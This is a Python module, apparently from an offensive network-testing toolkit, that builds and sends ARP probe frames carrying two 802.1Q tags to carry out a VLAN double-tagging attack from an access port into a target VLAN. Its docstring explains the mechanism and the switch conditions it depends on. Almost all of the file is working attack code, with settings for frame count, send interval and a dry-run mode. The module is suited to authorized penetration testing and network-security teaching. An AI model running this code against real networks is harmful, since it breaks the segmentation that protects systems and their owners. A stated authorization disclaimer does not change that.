"""Double tagging: send a frame with two 802.1Q tags to cross a VLAN boundary.

A trunk's native VLAN is sent untagged. When a switch receives a frame whose outer
tag matches its native VLAN, it removes that tag and forwards the frame with the
inner tag. If the inner tag names another VLAN, the frame enters that VLAN, which
the sender's own port does not belong to. The reply cannot use the same path, so
the attack is one way.

This module builds and sends the frames. Whether a switch removes the outer tag
depends on its configuration: the native VLAN has to match, and the trunk has to
carry the inner VLAN.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import ARP, Dot1Q, Ether, sendp
from scapy.packet import Packet

from macabre.attacks.arp_spoofing import parse_ipv4
from macabre.attacks.common import BROADCAST_MAC, Runner, normalize_unicast_mac, read_interface_mac, run_command

ARP_REQUEST = 1
ZERO_IP = "0.0.0.0"
ZERO_MAC = "00:00:00:00:00:00"


def _check_vlan(value: int, label: str) -> None:
    if not 1 <= value <= 4094:
        raise ValueError(f"The {label} must be between 1 and 4094.")


@dataclass(frozen=True)
class DoubleTaggingConfig:
    iface: str                  # attacker interface, on the access port under test
    native_vlan: int            # outer tag: the native VLAN of the trunk
    target_vlan: int            # inner tag: the VLAN the frame should enter
    probe_ip: str = "192.0.2.1" # address in the probe ARP request (documentation range by default)
    count: int = 0              # frames to send; 0 = until stopped
    interval: float = 1.0       # seconds between frames
    dry_run: bool = False       # build frames but do not send them

    def __post_init__(self) -> None:
        _check_vlan(self.native_vlan, "native VLAN")
        _check_vlan(self.target_vlan, "target VLAN")
        if self.native_vlan == self.target_vlan:
            raise ValueError("The native and target VLANs must be different.")
        parse_ipv4(self.probe_ip, "probe IP")


@dataclass
class DoubleTaggingStats:
    sender_mac: str = ""
    frames: int = 0
    status: str = ""


def build_double_tagged_frame(sender_mac: str, native_vlan: int, target_vlan: int, probe_ip: str) -> Packet:
    """ARP probe with an outer tag for `native_vlan` and an inner tag for `target_vlan`."""
    mac = normalize_unicast_mac(sender_mac)
    return (
        Ether(src=mac, dst=BROADCAST_MAC)
        / Dot1Q(vlan=native_vlan)
        / Dot1Q(vlan=target_vlan)
        / ARP(op=ARP_REQUEST, hwsrc=mac, psrc=ZERO_IP, hwdst=ZERO_MAC, pdst=probe_ip)
    )


def run_double_tagging(
    config: DoubleTaggingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[DoubleTaggingStats], None],
    run: Runner | None = None,
    send: Callable[..., Any] | None = None,
) -> DoubleTaggingStats:
    """Send double-tagged probes until `count` or `stop_event`."""
    run = run or run_command
    send = send or sendp

    if config.dry_run:
        stats = DoubleTaggingStats(
            status=f"Dry run: would send probes tagged {config.native_vlan} then {config.target_vlan}. "
                   "Nothing sent.",
        )
        on_progress(replace(stats))
        return stats

    sender_mac = read_interface_mac(config.iface, run)
    stats = DoubleTaggingStats(sender_mac=sender_mac)
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        frame = build_double_tagged_frame(sender_mac, config.native_vlan, config.target_vlan, config.probe_ip)
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        stop_event.wait(config.interval)
    return stats
